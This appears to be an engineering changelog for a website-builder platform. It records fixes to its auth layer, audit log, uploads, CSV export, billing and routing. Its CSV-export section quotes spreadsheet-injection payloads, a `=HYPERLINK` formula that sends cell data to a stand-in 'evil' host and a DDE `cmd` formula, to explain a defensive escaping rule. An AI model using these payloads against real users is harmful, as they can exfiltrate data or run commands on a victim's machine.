- **The eval found a RUNTIME bug, not just a type mismatch: password sign-in was broken for any member with 2FA.** `useAuthAction` was typed `send<{token, user}>`, but the server answers a 2FA account with `{pending, need}` and NO token — so it stored `undefined` as the session and gave the caller no way to learn a code was wanted. Every OTHER sign-in method already went through `settle`; password login was the one that did not. Found because the generator kept writing `"pending" in data` against a type that denied `pending` existed — it was right and the type was wrong. `SignInResult` is also a discriminated union now, so `if (data.pending)` narrows instead of yielding `{}`.
- **A member could not read its own role.** An owner grants one and `admin` tables check it, but `/auth/me` never returned it, so no page could gate admin UI on it — and `findUserById` did not even select `u.role`, so it would have read as undefined for everyone. `Member.role` now exists end to end, guarded at all three layers.
- **First eval run: 0/3 compiled — and the errors REPEATED, which is the whole point.** Three failures appeared in every sample and were all the same class as `PublicRow`/`RowId`/`claim`: the client API not being the shape a reasonable caller assumes. (1) **`useSessions` returned the `{sessions}` envelope** while `useRows` and `usePublicRows` unwrap via `select` — so the generator called `.map` straight onto it, three times out of three. It was the ONE list that behaved differently, added the same morning. (2) **`useDeleteRow` took a bare id while its sibling `useUpdateRow` takes an object** — the generator passed `{id}` to both; it now accepts either. (3) **the model annotates the mutation callback's parameter**, which TanStack's four-argument contravariant signature always refuses; the rules now say never to. Guarded by a test asserting every list hook unwraps.
- **`test/integration/page-gen-eval.mjs` + CI `page gen eval`** — the placeholder problem made measurable. The audit kept falling back with a DIFFERENT TypeScript error each run, and one sample per deploy cannot separate a systematic mismatch from noise while costing a Neon project, an R2 publish and fifteen minutes each time. The eval samples the generation call alone (no database, no publish, no account), validates → lints → compiles — **one call a sample, because production makes one call a build** — and counts distinct errors **by shape** (path and line stripped, identifiers replaced) so the same failure in two files reads as one problem. Reports "compiled / clean"; there is no "first try" column any more because every sample is one. It mirrors the pipeline rather than improving on it: a repair here would report a compile rate the platform does not deliver. Triggered by a change to the generator or the client API it writes against, not by every deploy.
- **`pagesRequest()` is the one definition of the generation call**, extracted from `worker.js` (which cannot be imported) into `page-gen.mjs`. Without it the eval restates the model, budget, tool and prompt — and then tunes something subtly different from what production runs, which makes every conclusion from it worthless. Guarded by a test asserting `generateSitePages` and the eval both call it and neither restates `model:` or `tool_choice`.
- **The placeholder mislabelled every access level but `user`.** It said "shared across visitors" for `collect` (write-only) and `admin` — the opposite of what they do, on the one page a failed build leaves the owner. Seen on a real published fallback. Now one wording per level.

- **INVITE CODES HAD NEVER WORKED, on any site.** `newInviteCode()` returns `XXXX-XXXX-XXXX` so it can be read aloud, every redemption path runs `normalizeCode` first (which strips the separators), and the mint stored the PRETTY form — so `burnInvite`'s `WHERE code=?` could never match, and neither could revoke. Found by the production audit on its first run; invisible to the unit suite, which drives a fake `burn` over already-normalized codes, so nothing spanned the two halves of `worker.js` where the seam is. Now stored normalized and displayed grouped. The guard asserts what the INSERT **binds**, not that the normalizer is mentioned — the first version passed with `stored` computed and then ignored, which is the live bug wearing a fix.
- **`claim` is optional and the rules said it was not.** `useCreateRow` types it `string | undefined` (only a `collect` table mints one), but rule 10 said the call "returns `{ row, claim }`" — so the generator wrote `onSuccess: ({ row, claim }: { row: Row; claim: string })`, which under `strictFunctionTypes` is not assignable to a callback whose `claim` is optional. `TS2322`, page refused, placeholder. The rules now teach the guarded shape (`(data) => { if (!data.claim) return; … }`), verified by compiling both shapes.
- **EVERY row-id argument in `@/lib/rows` demanded a `number`, and every id a page has is a STRING.** Route params and search params arrive as strings, so no page that edits, deletes or manages a row could compile — three separate TS errors in one production build, and the site published as the placeholder each time. Now `RowId = string | number` on every table-scoped hook: **`number` coming out, `string | number` going in**, since nothing does arithmetic on an id and it goes straight into a URL. The subtle one: `Omit<Partial<T>, "id">` is required in `useUpdateRow`, because `Partial<T>` already carries `id?: number` from `Row` and intersecting narrows `RowId` straight back to `number` — that was the third error, still failing after the other signatures were widened. The guard selects hooks **by behaviour** (table-scoped and takes an id), not by name: `\bRow\b` never matches inside `useDeleteRow`, and the first version passed while two hooks were still wrong. It strips comments first, because the file explains the asymmetry and prose about `id?: number` is not a signature.
- **`useClaimedRow` demanded `id: number`** and a route param is always a string, so the generator could not write a manage page that compiles: `TS2345`, the page refused, the whole site fell back to the placeholder. Same shape as the `PublicRow` bug. Now `string | number`.
- **`playwright` was never an npm dependency**, so `import("playwright")` threw and **every screenshot step in this repo has silently produced nothing** — including build-smoke's, which is why its artifact upload always found no file. Installed unsaved in the audit workflow, so the lockfile and the deploy are untouched.
- **Never write the skip-CI marker into a commit message or PR body, not even while explaining it.** GitHub scans the entire message and suppresses every workflow for that push. Done once, on 2026-07-29: a commit message describing why `auth-smoke.yml` needs the marker contained it, so the merge landed on `main` and **nothing deployed, nothing tested, nothing audited** — with a green tick and no failed run to notice. The recovery is a follow-up commit whose message does not contain it. Refer to it as "the skip-CI marker" in prose.

- **Changing an address kept `verified`.** `setEmail` wrote `email=?` and never touched `verified`, so a member could prove a real address, change to somebody else's, and stay "verified" on one they never proved. Inert only while `requireVerified` fails open for want of a mailer — **it becomes a live gate bypass the day that key ships**, which is exactly when nobody would be looking. Now `UPDATE _users SET email=?, verified=0` in ONE statement (the discipline `setPassword` follows with the epoch), and the route asks for the new address to be proved. A REFUSED change asks for nothing, or the endpoint is a way to mail anybody from our domain on demand.
- **`mask` was parsed, stored, and enforced by nothing.** `maskFields()` was written with the schema engine and had **zero callers**, so a table declaring it served the raw value to everyone — the third instance this session of implemented-and-unreachable, after `unique` and `teamRead`. Now called on the read path against the **resolved visitor's role**, never a role off the request (a mutation proved `?role=admin` would otherwise unmask everything). ONE call site, deliberately: a single-row GET is an id filter on the same list read, and the only other place a row is returned is the 201 echoing back what the visitor just submitted — redacting somebody's own data back to them is wrong, not safe.
- **The designer can now declare it**, or it would be enforced and unreachable the way `unique` was. Declared as an **array** of `{column, roles, keep}`, not a map keyed by column name: a map needs `additionalProperties` in a tool schema, and an under-specified schema there is what took the builder down for three merges. Both shapes parse; the stored shape stays the map.
- **The audit photographs a signed-in member, not just the home page.** The session is established by calling the auth API from INSIDE the page and writing the token to the key `rows.ts` reads — not by hunting for a form. Generated markup differs every build, so selector-hunting tests the model's layout choices rather than auth; doing it this way instead asserts two real things: that the stored token opens a member-scoped read, and that **the published bundle references `site_session_`** at all. If that convention ever drifts, every generated site stores a session nothing looks at and signs nobody in, silently. Deliberately NOT asserted: "the page looks different signed in" — a timetable can legitimately render the same either way, and that check fails on a correct site.
- **The content checks are skipped when the build fell back to the placeholder**, rather than failed. They cannot pass on a placeholder, so failing them reported one root cause three times and made a single generator problem look like three.
- **`test/integration/auth-smoke.mjs` + CI `auth smoke`** — 73 checks over the whole visitor-auth layer against the deployed Worker: signup (weak/invalid/duplicate/breached), login (byte-identical refusals), token kinds (a claim and a reset are not sessions; a token from another site is useless), per-device sessions, password and email change, own-rows scoping, 404-not-403 for another member's row, `publicView`, `mask`, claim links, roles, suspension, and all three signup modes plus the domain allow-list. **The schema is sent EXPLICITLY** rather than designed — the auth layer is under test, not the model's judgement about tables — which also skips the designer call. Screenshots and a per-check report are committed to `docs/auth-audit/`.
  - **`seed` goes at the TOP LEVEL of the build body, not inside `schema`**: the route reads `(designed && designed.seed) || body.seed`, and `designed` is null whenever a schema is sent explicitly. Nested, it is silently ignored.
  - **The commit message carries `[skip ci]`, and that is load-bearing** — the job pushes to `main`, `main` triggers Deploy, and Deploy triggers this job. Without it the audit re-runs itself forever, spending a build every cycle.

## The audit grown to the things it never covered (2026-07-29)

- **"It has tests" was not the claim it sounded like.** Six subsystems — TOTP, recovery codes, the brute-force delay, OAuth, teams, passkeys — had unit tests and had **never run against the deployed Worker**. The audit went 89 → ~155 checks, and the first run of the new half found **two live bugs, neither of which any of the 978 unit tests noticed**.
- **THE SECOND FACTOR WAS UNENFORCED ON PASSWORD SIGN-IN — the one method every site has.** `finishSignIn` is described as "the single place a session is minted", and it never was: it covers the registry methods (passkey, OAuth, emailed code), and the password route in `site-auth-routes.mjs` predates it and minted its own session with **no reference to `secondFactorRequired` at all**. Two independent causes, either alone sufficient: the route never asked, and `findUser` never SELECTed `totp_enabled`, so the answer would have been `undefined` → falsy → "no second factor". A member who enabled an authenticator app got recovery codes, a confirmation, and no protection. Both paths now mint through **one** `signPending` in `site-auth.mjs`.
- **`teamScope` was dead at a FIFTH layer.** The fix that made it reachable added `u.team_id` to the visitor query and then returned `{id, role, verified}` — dropping it. `teamOf` read `undefined`, every member on every site resolved as teamless, and two members of one team could not see each other's rows. Measured live.
- **Both guards that should have caught these were watching the layer BELOW the break.** The derived `_users` sweep asserts every column a query SELECTs is one something CREATEs — true throughout. The teams wiring test asserts the visitor query SELECTs `team_id` — also true. The new invariants run the other way: **every field the login decision READS must be one the login query supplies** (scanning the helper predicates too, since `secondFactorRequired` reads `totp_enabled` inside another module and a scan of the handler body alone sees nothing), and **the visitor object must CARRY every field `site-teams.mjs` reads off it**. Both derived at both ends; 4 mutations, all caught.
- **A generator fallback used to delete the browser half of the audit.** The browser checks were gated on the build producing a real app; they are not claims about the generator — the placeholder is served from the same origin by the same Worker. So a fallback silently removed nine auth checks on exactly the runs where something was already wrong. Only the content checks and the bundle-key check stay gated.

## The auth audit log (`site-audit.mjs`, 2026-07-29)

- **Everything the auth layer does was correct and none of it was ACCOUNTABLE.** A site owner could not answer the question people actually ask them — "did somebody else get into my account?" — because nothing was written down. A suspension, a role grant, forty failed sign-ins overnight and a password change from another country all left the same trace: none. `_auth_events` lives in the SITE's own Neon database, so deleting a site takes its log with it and Supabase stays off the visitor path.
- **Written by `ensureSiteUsers`, not by the registry's DDL** — the `_sessions` lesson restated. Plain email-and-password login WRITES to this table, and creating it only on the routes the registry owns would mean it existed where somebody happened to use a passkey and nowhere else, with every ordinary sign-in throwing on its own audit write. Asserted by a test that reads `worker.js`.
- **Three things it deliberately does NOT store, enforced in the shaping function so they hold for call sites written later.** (1) **Never a password, token, hash or code** — `meta` is an ALLOW-LIST of nine named scalar fields, not a filter, because the interesting failure is a caller passing the whole request body "for context". (2) **A NON-MEMBER's address is fingerprinted, never stored** — the owner's real need on a failed sign-in is "the same unknown address, forty times", which a stable per-site HMAC answers completely; storing it would turn every mistyped login into a contact list of people who never had an account to consent with. A MEMBER's address IS kept — the owner already has it on the member list. Never both, or the fingerprint becomes a lookup table to every member's address. **The fingerprint is per-site**, so two owners cannot confirm the same person tried both. (3) **IPs are truncated to /24 and /48** — enough to say "one source or forty", not enough to point at a house; anything unparseable is dropped rather than stored as-is.
- **`normalizeKind` is a closed set.** A typo'd kind is not a new category invented at a call site — it is a row the owner's filters would never show and nobody would notice was missing. `ok` is DERIVED from the kind, so a caller cannot mark a `login_failed` as a success and hide it from the count.
- **The retention default fails the safe way**: a nonsense value prunes NOTHING (same direction as `site-sessions.mjs`), because deleting too little costs storage and deleting too much destroys the only record that a thing happened, silently, usually right when somebody needs it. `undefined` still means "use the default" and is pinned apart from that. 90 days, hard ceiling 5000 rows, pruned on roughly one write in fifty — on the WRITE, because a table only trimmed when somebody opens the page grows without bound on every site nobody looks at.
- **Three derived guards, because "every action records something" is not enough.** It passes with only the FAILURES recorded. And "every declared kind is emitted" passes too, because `finishSignIn` emits `login` for the registry methods — so deleting the password path's success record survives both, and the log would show every wrong password and no successful sign-in, which is the most misleading state this table could be in. The third: **anything that calls `mk(` must record a non-failure kind**, derived from the one place these routes mint a token. 10 mutations, all caught.
- `finishSignIn` writes the row next to the token for the same reason it checks the second factor there — it is the one place a registry method becomes a session, so a method added later cannot sign somebody in silently. `record:false` is for the OAuth callback alone, which knows something that function cannot: whether the account was just CREATED. A `linked` outcome writes BOTH `oauth_link` and `login`, since the session was minted either way.
- **`GET /api/site/<slug>/events`** — owner-only, GET-only, `kind` allow-listed through `normalizeKind` and `member` parsed as an integer, so no query string reaches the statement as anything but a parameter. The headline is computed over a wider unfiltered window than the page, so "is something happening right now" does not change because somebody filtered to one member. `summarize` counts **sources**, not just failures — one member failing forty times is somebody who forgot their password; forty sources failing once each is not — and `membersTargeted`, which separates "guessing addresses" from "has a real one".
- **`me` is deliberately not logged** and that is asserted, not assumed: a signed-in page calls it on every load, and the rows would bury every event that matters.
- **`2fa_required` is the kind that gap needed.** A correct password on an account with a second factor is neither a sign-in (no session was minted) nor a failure (nothing failed), and for want of a name it was recorded as neither — so a thief who had the password and stopped at the second factor left the log completely empty. Written by BOTH halves of the surface: the password route and `finishSignIn`. It is not counted in `signIns`, because reporting somebody who never got in as having got in is the error in the direction that matters.
- **THE FIRST PRODUCTION RUN RECORDED 26 EVENTS WHERE THE RUN HAD CAUSED WELL OVER A HUNDRED**, non-deterministically which. `rec()` fires the write and does not await it, and **a Worker tears the request context down once the response is returned**, so a promise nobody is holding is cancelled mid-flight. A log that keeps a random subset is worse than none: the gaps read as "nothing happened". Now handed to `ctx.waitUntil`, which extends the context without delaying the reply — `await`ing it instead would put a database round trip in front of every sign-in. **Nothing in the unit suite can catch this by running** (there is no request lifecycle in it), so it is asserted on the source.
- **The owner routes had no `audit` dep at all.** `ownerDeps` is a THIRD dep object, separate from `siteAuthDeps` and `authFlowDeps`, and `role_change` · `suspend` · `unsuspend` · `team_change` · `member_delete` were recorded by `site-owner.mjs` and written by nothing. Wired **lazily** (`auditDeps(() => siteBackendBySlug(...))`) because that object is built BEFORE `assertOwner` runs, and resolving the connection eagerly does a lookup on behalf of somebody about to be refused.
- **The owner reads it at Cloud → Security log** (`siteSecurity` in `chat.js`). The headline is four numbers, and `separate sources` is the one that matters: 23 failures from 1 source is somebody who forgot their password, and 23 from 6 is not. A member is named, a stranger is a tag — the panel says so in a footnote, because an owner seeing `unknown·7f3a1c` twice needs to know that is deliberate and not a bug. **This is the FIRST owner-console panel wired to the live API**; the other 39 `site*` panels still call routes deleted with the D1 runtime on 2026-07-27 and every one of them 404s.

The source-reading tests search `worker.js` RAW, with patterns that cannot appear in prose.

## The person who filled in the form, coming back (`site-claim.mjs`, 2026-07-28)

- **A `collect` row had no principal.** Anyone may submit, nobody may read — which is right, and it meant the customer who booked a haircut could never see the appointment again, move it or cancel it. Only the site owner could, inside isibi. The row wasn't missing and the page wasn't missing: the **subject** was. Measured across every site the builder has made.
- **A claim token IS the subject** — the magic-link shape. `signClaim`/`verifyClaim` in `site-auth.mjs` mint the **third token kind** alongside session and reset. Three bindings, each load-bearing: the SITE comes free (`sessionKey` already mixes the slug in), the TABLE is in the payload (or a claim on `bookings` 4 opens `enquiries` 4), and the ROW is in the payload (or a claim on row 1 opens row 2 — ids are sequential integers). 90-day TTL because an appointment can be months out and the link lives in an email, bounded because a token that never expires can never be taken back.
- **`verifySession` was a DENY-list and is now an ALLOW-list.** It read `use !== "reset"` — correct for exactly as long as `reset` was the only other kind. Adding a third kind naively would have meant **every booking receipt was a valid login**, since a claim simply isn't a reset. `undefined` stays valid or every live member is signed out.
- **Issued exactly once**, in the 201 from the insert, best-effort (a booking that succeeded must not fail because a signature couldn't be produced). `GET`/`DELETE /api/db/<slug>/rows/<table>/<id>?claim=<token>` read and cancel it. Placed **after** the rate limit and **before** the access gate — the same position, and for the same reason, as the `publicView` projection: escaping that gate narrowly is the entire purpose.
- **It buys one row and nothing else** — no list, no filter, no ordering, no neighbouring id, and `collect` stays write-only for everyone else. A bad token and a missing row answer **byte-identically** (404), because a distinct "bad claim" confirms which ids exist. Non-collect tables are refused even with a signature that checks out: a `user`/`feed` row already has a real owner, and a second weaker credential for it would be a way around the account, not a way in. Cancel is **idempotent** — a cancel link gets clicked twice, and a 404 on the second click reads as a broken link.
- **Reachable, not just built:** `useCreateRow` types the `claim` it returns (without that, reading it fails `tsc` and the build refuses the page), `useClaimedRow`/`useCancelClaim` exist in `@/lib/rows`, and PAGE_RULES rule 10 tells the generator to build the manage page for appointments/orders/reservations but not for a plain contact form. Guarded by a drift test asserting the rules never name an export the template lacks. `test/site-claim.test.mjs` (32 tests; **two mutants survived the first draft** — the table check was masking the kind check, and the id-guard test used an invalid token so it never reached the guard).
- **Not done yet:** amending (PATCH answers an honest 405). A changed booking has to re-run the uniqueness and overlap checks and deserves its own tests.

- The table name is allow-listed against the site's own declared schema (it reaches SQL), `order` is allow-listed against the declared columns, limit/offset are clamped, newest-first by default, and `_fts` is stripped the same way the public read strips it. `test/site-owner.test.mjs` (38 tests, 25 mutations).

A row id that is not a positive integer is 400, not a Postgres type error surfacing as a 500.
- **`_users` is reachable only through `/members`**, because it is deliberately not part of the declared schema — which is what puts it out of reach of every other route here. That one place names its columns explicitly (`SELECT *` would ship `pass_hash` the moment someone adds a column). Deleting a member leaves their rows alone: `owner_id` stops matching anyone, but a deleted customer's bookings should not silently vanish from the owner's list.

## Telling the owner a booking arrived (`site-notify.mjs`, 2026-07-28)

- **Nobody did.** A barber shop took an appointment and the only way to find out was to log into isibi and look — which is a fine place to review bookings and a terrible way to learn one exists. Now: a `collect` insert emails the site owner, through the existing Go Farther mailer.

## What a published site looks like when somebody SHARES it (`site-meta.mjs`, 2026-07-28)

- **A generated site had a `<title>` and nothing else** — no description, no Open Graph — and its `<div id="root">` is empty until JavaScript runs. Google runs JavaScript, so it indexes eventually; **link previews do not**. WhatsApp, iMessage, Slack, Facebook and LinkedIn fetch the HTML once, read the head, and render what is there. So a barber shop sending customers their own link got a bare URL, on every site the builder has ever published.
- `injectMeta` runs at publish time inside `writeSiteDistToR2`, **gated on `index.html`** (rewriting a bundle or a stylesheet would corrupt the dist silently). The head belongs to the built dist, which the model never sees, so this is the only place it can happen.
- **Idempotent by construction** — the block is fenced in `<!--isibi:meta-->` comments and replaced, so republishing fifty times leaves one copy and a renamed site does not keep its old name. Escapes into attributes (brand and description are model-written), collapses whitespace (a newline in an attribute is a broken tag), caps title 70 / description 200, and the twitter card type follows whether there is actually an image (`summary_large_image` with none renders an empty box).
- **It can only ever no-op, never error.** No head, no meta, unparseable input → the html comes back unchanged. A site published without a description is a far smaller problem than one published broken.
- `description` is now a REQUIRED field on `design_schema` — one customer-facing sentence. A revise sends no brief, so the fallback chain is designed → body → the stored `brief` → the instruction. The og:image is the owner's first upload if there is one. `test/site-meta.test.mjs` (12 tests, 14 mutations).

## Taking the data out (`site-export.mjs`, 2026-07-28)

- **`GET /api/site/<slug>/export?table=<t>&format=csv|json`** — the Backups panel has had a working download button since the D1 era wired to `/api/site/backend/export`, a route deleted 2026-07-27, so a barber shop's bookings could be read on screen and never got out of the building. Same `assertOwner` gate, same schema allow-list, `_fts` stripped, oldest-first, capped at `MAX_EXPORT_ROWS` 10000.
- **The interesting part of a CSV export is not the commas — it is CSV INJECTION.** A `collect` table is by definition text a stranger typed into a form, and Excel/LibreOffice/Sheets all EVALUATE a cell beginning `=`, `+`, `-` or `@`. A booking whose notes read `=HYPERLINK("https://evil/?"&A1,"receipt")` builds a live link out of the neighbouring cell the moment the owner opens the file; `=cmd|'/c calc'!A1` is worse. The person attacked is the OWNER, by their own spreadsheet, using data our API handed them. **Quoting does not fix it** — the CSV parser strips the quotes before the formula parser sees the cell — so the value is prefixed with `'`, which is what those programs read as "this is text".
- **`-` is handled narrowly on purpose.** It is a real trigger (`-1+1` evaluates) but also how every negative number begins, so a value that is simply a number is left alone and anything else starting dangerously is neutralised. Blanket-prefixing would corrupt ordinary data in the common case to defend against the rare one.
- Columns are `id`, `created_at`, then the declared ones, then **anything the rows really have that the schema never named** — an export that silently drops a column is not a backup. `attachment`, never `inline`: owner-supplied text must not render as a document on our origin. `test/site-export.test.mjs` (23 tests, 24 mutations).

## Pictures for a published site (`site-uploads.mjs`, 2026-07-28)

- **`/u/<slug>/<file>` has served uploads from R2 since the D1 era and NOTHING ever wrote one** — the read half survived the 2026-07-27 runtime deletion, the write half did not. So no site the builder produced could have a photo. `POST`/`GET /api/site/<slug>/uploads` and `DELETE /api/site/<slug>/uploads/<file>` are the write half, behind the same `assertOwner` gate as rows and analytics.
- **Stored at `uploads/<slug>/`, deliberately NOT under `sites/<slug>/`** — `deleteSitePrefix` wipes that prefix on every publish, and a revise must not delete the owner's photographs.
- **The name is a hash of the CONTENT.** Three things fall out and all matter: a caller cannot choose a path (traversal and cross-site overwrite closed by construction, not by escaping), re-uploading the same picture is free and idempotent, and `/u/` serving `immutable` is actually TRUE because the name *is* the bytes. A hash that does not clean to 32 hex chars is refused rather than stored — `handleUploadDelete` only accepts the shape we mint, so a degenerate name would be an object nothing could ever address again.
- **SVG is refused, deliberately.** `/u/` serves `content-disposition: inline` from isibi.ai and an SVG is a document that can carry `<script>` — stored XSS on our own origin, which `nosniff` does not help with because the type would be honestly declared. PNG/JPEG/WebP/GIF only, decided by **leading bytes**, never the declared Content-Type.
- Caps: 5 MB/file, 200 files and 100 MB per site; a re-upload does not count against them (refusing would be refusing to do nothing). Raw bytes on the wire, not base64 — which would inflate a photo by a third for nothing, since the declared type is ignored anyway. **The Worker digests the bytes directly, NOT `sha256hex`** — that one takes a string and would TextEncode a 5 MB image into a ~20 MB decimal string first.
- **Visitor uploads (`POST /api/db/<slug>/uploads?table=<t>`, 2026-07-28)** — unauthenticated for the same reason the rest of `/api/db` is: a customer booking a haircut has no account. Which makes it a public endpoint accepting arbitrary bytes and serving them from isibi.ai, so the answer to "may I?" is narrow: **the table must be one a visitor can WRITE and must DECLARE an image column**. A barber shop whose booking form is six text fields accepts nothing — that is the answer for most sites, and it is what keeps this from being open image hosting for anyone who knows a slug. Extra limits over the owner's: 2 MB a file, **5 uploads/min per IP per site checked BEFORE the bytes are hashed or listed**, and a visitor allowance of 50 files / 25 MB counted only against files marked `visitor` — so a flood can never crowd the owner out of their own storage. `customMetadata` must be asked for explicitly on an R2 list (`include: ["customMetadata"]`) or every visitor upload looks like one of the owner's and the allowance counts nothing.
- **The schema designer had to be taught, or the feature could never fire.** Measured live 2026-07-28 across all seven generated sites: the designer put image columns on `display` tables **every time** (`image_url`, `photo_url`, `cover`) and on a `collect` or member table **never** — so a visitor upload, which requires one, was refused on every site that exists. The `columns` schema now says what a picture column is, that a `display` one is content the OWNER fills in after the build, and that a `collect`/member one goes in ONLY when the brief says the VISITOR sends a picture. Guarded by a test that reads worker.js.
- Client: `uploadFile`/`useUploadFile` in `@/lib/rows` — upload, then submit the returned URL as an ordinary text field. **The row write stays plain JSON**; there is no multipart and no file field. Generator rule 8 says so, with a drift test asserting the export it names really exists in the template.
- Frontend: image-ish columns in the Data panel's edit form get a thumbnail and an Upload button (`isImageCol`, a naming guess — the column is plain text either way, so a wrong guess costs a button, never a broken save). The generator is told rule 7: a picture column holds a URL, render a bare `<img>`, **always guard it** because the owner fills these in after the build. `test/site-uploads.test.mjs` (27 tests, 23 mutations).

## The owner's traffic (`site_analytics`, wired 2026-07-28)

- **`GET /api/site/<slug>/analytics`** → `{ok, views, visitors, views7, visitors7, series:[{day,views}]}`. `site_hits` has been written on every visit since the D1 era (hashed IP, bots skipped, `ctx.waitUntil` so serving is never slowed) and **nothing had ever read it** — the route the panel calls did not exist, so every published site collected traffic its owner could never see. 64 real hits across 20 slugs by the time this was wired.
- **The RPC's own ownership check was against `published_sites`** — the OLD D1-era table. The current builder records sites in `site_backends`, and the two share **zero** rows, so the check could never pass for any site the builder makes: even with a route, every call would have returned `{ok:false}`. The check moved OUT of SQL into the Worker, where `site-owner.mjs` already does it (fails closed, 404-not-403, tested). One ownership mechanism, not two that can disagree.
- **That also made it service_role-only**, closing the advisor finding that `site_analytics` was `anon`-executable — safe until then only because its internal check happened to refuse everyone.
- `assertOwner` is split out of `openSite` because analytics needs the GATE but not a Neon connection: its numbers are in Supabase, and resolving a connection would be a round trip spent on nothing. The aggregation stays an RPC because count-distinct and a seven-day `generate_series` are not things a REST filter can express.
- **A failed read is 503, never zeros.** "Nobody visited your site" is a very different and much worse thing to tell someone than "try again". A site genuinely unvisited still reads as zeros and an empty week.

## Edge routing for published sites (`site-routing.mjs`)

- **Supabase was on the read path and should not have been.** Answering "which Neon database is this slug?" cost TWO sequential cross-region calls to Supabase (`site_backends` by slug → `user_site_project` by uid) on **every visitor read**, for a value written once at build time that never changes. Supabase is the app's auth/user store, not a routing table for public traffic.
- **KV holds `route:<slug>` → connection string.** Supabase stays the source of truth: a miss falls back to it and backfills, so an unbound or empty namespace is **slow, never wrong** — which is what lets the code ship before the namespace exists. A KV outage degrades to the old path rather than taking the published sites down.
- **Only the connection string is stored, deliberately.** KV is eventually consistent (a write can take ~a minute to reach every colo), which is harmless for a value fixed at build time and would be a real bug for the SCHEMA — a revise adds tables, and a stale schema 404s the site's own new tables. The schema keeps its 15s in-isolate cache and its `_meta` read.
- Written by `ensureSiteBackend` at build (best-effort — a build that succeeded must not fail over a cache write), deleted by `DELETE /api/site/<slug>` **before** the database is dropped (a route outliving its database answers with a connection error instead of an honest 404). Absence is never cached — a slug that does not resolve is usually a build still finishing, and KV entries written without a TTL never expire.
- **The binding does not exist yet.** `.github/workflows/create-kv.yml` (manual) creates the namespace and prints the id for `wrangler.jsonc`; until it is added, `env.SITE_ROUTES` is undefined and the Worker uses the Supabase path. `test/site-routing.test.mjs` (15 tests, mutation-checked).
- **Measured 2026-07-28, why the in-isolate cache alone was not enough:** after deploying `ttl-cache.mjs` the same six-row read was 0.27–2.00s, median **1.05s** — three of twelve requests hit the cache at ~0.3s and the rest paid the full four round trips, because Cloudflare evicts idle isolates and a low-traffic site is almost never warm. The per-isolate cache helps a multi-read page load; only KV removes the Supabase hop for the FIRST read, which is the one a visitor waits on.

## Postgres connection health

- **Measured live 2026-07-28**: one row read on a published site was **~0.9s median** (0.61–2.31s, six rows) because it cost **four sequential round trips** — `site_backends` by slug → `user_site_project` by uid → the site's `_meta` schema → the actual query — with no caching anywhere. Three of the four answer the same thing every time. A visit rendering one list plus a form submit paid ~8 round trips, 6 of them lookups.
- The driver was already right: `@neondatabase/serverless`'s HTTP `neon()` (one round trip per query, no socket handshake), cached per connection string. The latency was round trips, not the client.
- **`ttl-cache.mjs`** — bounded, expiring, per-isolate, with `memoize` so concurrent misses share one in-flight lookup (a cold isolate rendering three lists otherwise fires three identical resolutions before the first returns). `siteBackendBySlug` caches **5 min** (a slug's database is immutable for the life of the site) and is invalidated explicitly by `DELETE /api/site/<slug>` **before** teardown — a cached string pointing at a dropped database answers with a connection error instead of a 404. `loadSiteSchema` caches **15 s** and `applySiteSchema` clears it, short because that invalidation only reaches the isolate that ran the build; every other PoP heals by expiry, and a revise must be visible on the next refresh rather than after a minute of the site 404ing its own new tables. **Never caches null** — a slug that does not resolve is usually one whose build is still finishing. `test/ttl-cache.test.mjs` (15 tests, mutation-checked).
- **Supabase advisors, checked 2026-07-28**: no ERROR-level findings. `site_analytics` is `anon`-executable but verified to return `{ok:false}` to an unauthenticated caller. `add_credits`/`credit_back`/`set_plan` correctly do NOT appear as `authenticated`-executable (service_role only). Open, minor: leaked-password protection is off in Auth; `citext` lives in `public`; ~30 RLS policies call `auth.<fn>()` per row instead of `(select auth.<fn>())`; four unindexed foreign keys on `site_*` tables.

## Backend endpoints & the money path

- **41 `/api/*` routes; 40 gate on `authUser`.** The one that doesn't is `/api/stripe/webhook` (Stripe can't hold a session) — it authenticates by HMAC instead. `/api/m/*` is allow-listed as public because the signed expiring token IN the path IS the credential. There is **no blanket gate** — only the 404 fallthrough at the bottom of the router — so each route gates itself. `test/api-auth.test.mjs` reads worker.js and fails if any route outside the 2-entry allow-list lacks `authUser`, which turns the long-standing "all `/api/*` require auth" claim into an enforced invariant. The smoke test also probes 14 GET routes live against the deployed Worker.
- **`stripe-webhook.mjs`** — the signature check (the *only* thing between a stranger and `add_credits`) plus `mintFromEvent`, the decision of what to credit. Extracted from `worker.js` 2026-07-28 and tested (30 tests, mutation-checked): forged signature, signature over a different body, re-stamped timestamp, replay past the ±300s window, future-dated timestamp, mid-rotation second secret (`STRIPE_WEBHOOK_SECRET` may be comma-separated), empty secret fails closed. Minting guards that each represent free credits if removed: subscription-mode sessions don't mint (their invoice does, else the first month double-grants), unpaid sessions don't, **$0/fully-discounted invoices don't** (a coupon would otherwise buy a month), credits come only from metadata we set at checkout, and `ref` (session/invoice id) makes `add_credits` idempotent against Stripe retries. Top-ups get `tier: null` — only memberships grant storage.
- **`billing.mjs`** — `PLANS`/`TOPUPS`, `selectPurchase`, `checkoutForm`, `LIVE_SUBSCRIPTION_STATUSES`, `falRequestId`, `refundVerdict`/`refundOnResultStatus` (24 tests, mutation-checked). **The subtle one:** a membership's `user_id`/`credits` MUST go under `subscription_data[metadata]`, not the session's own `metadata` — only the former rides onto renewal invoices, so getting it wrong credits month one and then silently nothing while the customer keeps paying. A top-up is the mirror image (session metadata, no recurrence). **Bug found and fixed 2026-07-28:** `PLANS[String(body.plan)]` accepted `"__proto__"`/`"constructor"` (both truthy) and sent Stripe `unit_amount: "undefined"` — now `Object.hasOwn` plus a string/number type check.

## Rate limits

Postgres side: `public.use_quota(p_kind, p_limit)` (SECURITY DEFINER, atomic check+log over the client-locked `usage_log` table), fail-open in the Worker if the RPC is unreachable. **Live gates**: `/api/direct`'s per-call credit charge (`orchestratorCostMicros`) is the real limiter now — there is **no** `useQuota(request,"director",…)` call (the earlier doc claimed one that isn't in the code). The web-search research step keeps its own tighter `useQuota(request, "research", 30)`/day (directly-callable, real-money), checked BEFORE the charge (2026-07-15) so a capped user isn't debited. 429s `daily limit reached`; every director step fails soft client-side (ask→localAsk, compose/revise→local prompt, research→no facts) so a capped user can still generate. The **generation gate stays off** (user's call, 2026-07-03) — to re-enable add `useQuota(request, "gen", 60)` back on /api/video|image|audio.

